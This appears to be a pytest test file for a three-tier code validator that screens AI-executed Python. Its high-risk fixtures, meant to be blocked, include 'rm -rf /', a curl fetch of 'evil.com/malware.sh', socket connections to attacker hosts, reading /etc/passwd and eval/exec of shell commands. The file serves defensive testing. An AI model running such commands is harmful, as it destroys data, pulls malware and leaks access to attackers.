"""
Unit tests for validator.py - Code Validator with 3-Tier Risk Assessment

Tests cover:
1. LOW RISK: Safe code that auto-allows execution
2. MEDIUM RISK: Legitimate imports requiring user permission
3. HIGH RISK: Dangerous imports that are always blocked
4. Unknown imports (default to MEDIUM risk)
5. Dangerous builtin functions
6. File operation restrictions
"""
import pytest
from app.services.ai_executor.validator import CodeValidator, ValidationResult
import textwrap

class TestCodeValidator:
    """Test suite for CodeValidator 3-tier security system"""

    def setup_method(self):
        """Initialize validator before each test"""
        self.validator = CodeValidator()

    # ==================== LOW RISK TESTS ====================

    def test_low_risk_pandas_numpy(self):
        """Test LOW RISK imports: pandas + numpy should auto-allow"""
        safe_code = textwrap.dedent("""
            import numpy as np
            import pandas as pd

            data = np.array([1, 2, 3, 4, 5])
            df = pd.DataFrame({'values': data})
            print(df.mean())
        """)

        result = self.validator.validate(safe_code)

        assert result.is_safe == True, "LOW RISK code should be safe"
        assert result.risk_level == "low", "Should be LOW risk"
        assert result.requires_permission == False, "Should NOT require permission"
        assert "numpy" in result.allowed_imports, "Should allow numpy"
        assert "pandas" in result.allowed_imports, "Should allow pandas"

    def test_low_risk_openpyxl(self):
        """Test LOW RISK: openpyxl for Excel operations"""
        excel_code = textwrap.dedent("""
            from openpyxl import load_workbook

            wb = load_workbook('/tmp/input/file.xlsx')
            ws = wb.active
            ws['A1'] = 'Hello'
            wb.save('/tmp/output/modified.xlsx')
        """)

        result = self.validator.validate(excel_code)

        assert result.is_safe == True
        assert result.risk_level == "low"
        assert result.requires_permission == False
        assert "openpyxl" in result.allowed_imports

    def test_low_risk_json_csv(self):
        """Test LOW RISK: json and csv libraries"""
        data_code = textwrap.dedent("""
            import json
            import csv
            from datetime import datetime

            data = {'timestamp': str(datetime.now())}
            json_str = json.dumps(data)
            print(json_str)
        """)

        result = self.validator.validate(data_code)

        assert result.is_safe == True
        assert result.risk_level == "low"
        assert result.requires_permission == False
        assert "json" in result.allowed_imports
        assert "csv" in result.allowed_imports
        assert "datetime" in result.allowed_imports

    # ==================== MEDIUM RISK TESTS ====================

    def test_medium_risk_requests(self):
        """Test MEDIUM RISK: requests library requires permission"""
        api_code = textwrap.dedent("""
            import requests
            import pandas as pd

            response = requests.get('https://api.stripe.com/v1/charges')
            data = response.json()
            df = pd.DataFrame(data)
        """)

        result = self.validator.validate(api_code)

        assert result.is_safe == True, "MEDIUM RISK can execute IF user approves"
        assert result.risk_level == "medium", "Should be MEDIUM risk"
        assert result.requires_permission == True, "Should require permission"
        assert "requests" in result.restricted_imports, "Should flag requests"
        assert "requests" in result.explanation, "Should explain why requests is needed"
        assert len(result.warnings) > 0, "Should have warnings"

    def test_medium_risk_urllib(self):
        """Test MEDIUM RISK: urllib libraries require permission"""
        url_code = textwrap.dedent("""
            import urllib3
            from urllib.request import urlopen

            http = urllib3.PoolManager()
            response = http.request('GET', 'https://example.com')
        """)

        result = self.validator.validate(url_code)

        assert result.is_safe == True
        assert result.risk_level == "medium"
        assert result.requires_permission == True
        assert "urllib3" in result.restricted_imports or "urllib" in result.restricted_imports

    def test_medium_risk_xlrd(self):
        """Test MEDIUM RISK: xlrd for legacy .xls files"""
        xls_code = textwrap.dedent("""
            import xlrd

            workbook = xlrd.open_workbook('/tmp/input/legacy.xls')
            sheet = workbook.sheet_by_index(0)
            print(sheet.cell_value(0, 0))
        """)

        result = self.validator.validate(xls_code)

        assert result.is_safe == True
        assert result.risk_level == "medium"
        assert result.requires_permission == True
        assert "xlrd" in result.restricted_imports
        assert "legacy Excel" in result.explanation or ".xls" in result.explanation

    def test_medium_risk_unknown_import(self):
        """Test MEDIUM RISK: unknown imports default to MEDIUM risk"""
        unknown_code = textwrap.dedent("""
            import beautifulsoup4
            import pandas as pd

            # Unknown library not in whitelist
            soup = beautifulsoup4.BeautifulSoup('<html></html>')
        """)

        result = self.validator.validate(unknown_code)

        assert result.is_safe == True, "Unknown imports are MEDIUM risk (can execute with permission)"
        assert result.risk_level == "medium", "Unknown should default to MEDIUM"
        assert result.requires_permission == True, "Should require permission"
        assert "beautifulsoup4" in result.restricted_imports
        assert "not in standard whitelist" in result.explanation, "Should warn about unknown library"

    def test_medium_risk_multiple_imports(self):
        """Test MEDIUM RISK: multiple medium risk imports"""
        multi_code = textwrap.dedent("""
            import requests
            import xlrd
            import pandas as pd

            # Multiple MEDIUM risk libraries
            response = requests.get('https://api.example.com')
            workbook = xlrd.open_workbook('/tmp/input/data.xls')
        """)

        result = self.validator.validate(multi_code)

        assert result.is_safe == True
        assert result.risk_level == "medium"
        assert result.requires_permission == True
        assert "requests" in result.restricted_imports
        assert "xlrd" in result.restricted_imports
        assert "pandas" in result.allowed_imports, "LOW risk imports should still be allowed"

    # ==================== HIGH RISK TESTS ====================

    def test_high_risk_os_import(self):
        """Test HIGH RISK: os import is always blocked"""
        os_code = textwrap.dedent("""
            import os
            import pandas as pd

            files = os.listdir('/')
            print(files)
        """)

        result = self.validator.validate(os_code)

        assert result.is_safe == False, "HIGH RISK should be blocked"
        assert result.risk_level == "high", "Should be HIGH risk"
        assert result.requires_permission == False, "Never allowed, no permission"
        assert "os" in result.reason.lower(), "Should mention os in reason"
        assert "always blocked" in result.reason.lower() or "high risk" in result.reason.lower()
        assert "os" in result.restricted_imports

    def test_high_risk_subprocess(self):
        """Test HIGH RISK: subprocess is always blocked"""
        subprocess_code = textwrap.dedent("""
            import subprocess
            subprocess.run(['rm', '-rf', '/'])
        """)

        result = self.validator.validate(subprocess_code)

        assert result.is_safe == False
        assert result.risk_level == "high"
        assert "subprocess" in result.reason.lower()

    def test_high_risk_socket(self):
        """Test HIGH RISK: socket is always blocked"""
        socket_code = textwrap.dedent("""
            import socket
            s = socket.socket()
            s.connect(('evil.com', 80))
        """)

        result = self.validator.validate(socket_code)

        assert result.is_safe == False
        assert result.risk_level == "high"
        assert "socket" in result.reason.lower()

    def test_high_risk_pickle(self):
        """Test HIGH RISK: pickle is always blocked (unsafe serialization)"""
        pickle_code = textwrap.dedent("""
            import pickle

            malicious_data = pickle.loads(user_input)  # Code execution risk
        """)

        result = self.validator.validate(pickle_code)

        assert result.is_safe == False
        assert result.risk_level == "high"
        assert "pickle" in result.reason.lower()

    def test_high_risk_from_import(self):
        """Test HIGH RISK: 'from os import system' is blocked"""
        from_code = textwrap.dedent("""
            from os import system
            system('rm -rf /')
        """)

        result = self.validator.validate(from_code)

        assert result.is_safe == False
        assert result.risk_level == "high"
        assert 'os' in result.reason.lower()

    # ==================== DANGEROUS BUILTIN TESTS ====================

    def test_high_risk_eval_builtin(self):
        """Test HIGH RISK: eval() is blocked"""
        eval_code = textwrap.dedent("""
            import pandas as pd
            user_code = "print('malicious')"
            eval(user_code)
        """)

        result = self.validator.validate(eval_code)

        assert result.is_safe == False
        assert result.risk_level == "high"
        assert 'eval' in result.reason.lower()

    def test_high_risk_exec_builtin(self):
        """Test HIGH RISK: exec() is blocked"""
        exec_code = textwrap.dedent("""
            malicious_code = "import os; os.system('ls')"
            exec(malicious_code)
        """)

        result = self.validator.validate(exec_code)

        assert result.is_safe == False
        assert result.risk_level == "high"
        assert 'exec' in result.reason.lower()

    def test_high_risk_compile_builtin(self):
        """Test HIGH RISK: compile() is blocked"""
        compile_code = textwrap.dedent("""
            code_obj = compile("print('test')", "<string>", "exec")
            exec(code_obj)
        """)

        result = self.validator.validate(compile_code)

        assert result.is_safe == False
        assert result.risk_level == "high"
        assert 'compile' in result.reason.lower()

    def test_low_risk_pandas_eval(self):
        """Test LOW RISK: pandas DataFrame.eval() is OK (not builtin eval)"""
        pandas_eval_code = textwrap.dedent("""
            import pandas as pd

            df = pd.DataFrame({'A': [1, 2, 3], 'B': [4, 5, 6]})
            df['C'] = df.eval('A + B')  # This is pandas.eval, not builtin
        """)

        result = self.validator.validate(pandas_eval_code)

        assert result.is_safe == True, "pandas.eval() should be allowed"
        assert result.risk_level == "low"

    # ==================== FILE OPERATION TESTS ====================

    def test_low_risk_allowed_file_paths(self):
        """Test LOW RISK: /tmp/input and /tmp/output paths are allowed"""
        input_code = textwrap.dedent("""
            import pandas as pd
            df = pd.read_excel('/tmp/input/data.xlsx')
        """)

        output_code = textwrap.dedent("""
            with open('/tmp/output/result.txt', 'w') as f:
                f.write('Hello')
        """)

        result_input = self.validator.validate(input_code)
        result_output = self.validator.validate(output_code)

        assert result_input.is_safe == True
        assert result_input.risk_level == "low"
        assert result_output.is_safe == True
        assert result_output.risk_level == "low"

    def test_high_risk_unauthorized_file_paths(self):
        """Test HIGH RISK: unauthorized file paths are blocked"""
        root_code = textwrap.dedent("""
            with open('/etc/passwd', 'r') as f:
                data = f.read()
        """)

        home_code = textwrap.dedent("""
            with open('/home/user/secret.txt', 'r') as f:
                secrets = f.read()
        """)

        result_root = self.validator.validate(root_code)
        result_home = self.validator.validate(home_code)

        assert result_root.is_safe == False
        assert result_root.risk_level == "high"
        assert '/etc/passwd' in result_root.reason

        assert result_home.is_safe == False
        assert result_home.risk_level == "high"
        assert 'unauthorized' in result_home.reason.lower()

    def test_high_risk_input_builtin(self):
        """Test HIGH RISK: input() is blocked (dynamic file paths)"""
        dynamic_code = textwrap.dedent("""
            import pandas as pd

            file_path = input("Enter file path: ")
            df = pd.read_excel(file_path)  # Dynamic path - security risk
        """)

        result = self.validator.validate(dynamic_code)

        assert result.is_safe == False
        assert result.risk_level == "high"
        assert 'input' in result.reason.lower()

    # ==================== EDGE CASE TESTS ====================

    def test_high_risk_syntax_error(self):
        """Test HIGH RISK: syntax errors are blocked"""
        invalid_code = textwrap.dedent("""
            import pandas as pd
            df = pd.read_excel(  # Missing closing parenthesis
        """)

        result = self.validator.validate(invalid_code)

        assert result.is_safe == False
        assert result.risk_level == "high", "Syntax errors should be HIGH risk"
        assert 'syntax' in result.reason.lower()

    def test_high_risk_complex_attack(self):
        """Test HIGH RISK: code with multiple violations (should catch first)"""
        attack_code = textwrap.dedent("""
            import os
            import subprocess
            import socket

            # Delete files
            os.system('rm -rf /')

            # Execute malicious command
            subprocess.run(['curl', 'evil.com/malware.sh'])

            # Open network connection
            s = socket.socket()
            s.connect(('attacker.com', 1337))

            # Evaluate malicious code
            eval("__import__('os').system('whoami')")
        """)

        result = self.validator.validate(attack_code)

        assert result.is_safe == False
        assert result.risk_level == "high"
        # Should catch at least one HIGH risk import
        assert any(danger in result.reason.lower() for danger in ['os', 'subprocess', 'socket'])

    def test_medium_risk_mixed_known_unknown(self):
        """Test MEDIUM RISK: mixed known + unknown imports"""
        mixed_code = textwrap.dedent("""
            import requests  # Known MEDIUM
            import beautifulsoup4  # Unknown MEDIUM
            import pandas as pd  # Known LOW

            response = requests.get('https://api.example.com')
        """)

        result = self.validator.validate(mixed_code)

        assert result.is_safe == True
        assert result.risk_level == "medium"
        assert result.requires_permission == True
        assert "requests" in result.restricted_imports
        assert "beautifulsoup4" in result.restricted_imports
        assert "pandas" in result.allowed_imports
        # Explanation should separate known vs unknown
        assert "known" in result.explanation.lower() or "unknown" in result.explanation.lower()
